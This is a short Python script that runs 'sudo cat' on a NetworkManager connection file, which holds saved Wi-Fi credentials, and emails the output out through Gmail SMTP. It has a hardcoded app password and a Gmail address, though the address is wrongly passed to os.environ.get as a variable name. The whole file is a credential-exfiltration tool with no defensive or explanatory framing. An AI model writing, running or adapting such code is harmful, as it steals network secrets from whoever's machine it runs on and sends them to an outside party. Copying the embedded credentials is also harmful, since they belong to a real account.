import subprocess
import smtplib
import os

def send_message(email, password, txt):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, txt)
    server.quit()

# Replace with your environment variable names
email_address = os.environ.get("1.ibragimovvvvv@gmail.com")

# Generate App Password from your Google Account security settings
app_password = "fbuc blhf oglh bwxa"

command = "sudo cat /etc/NetworkManager/system-connections/IBRAGIMOV.nmconnection"
result = subprocess.check_output(command, shell=True, text=True)

send_message(email_address, app_password, result)
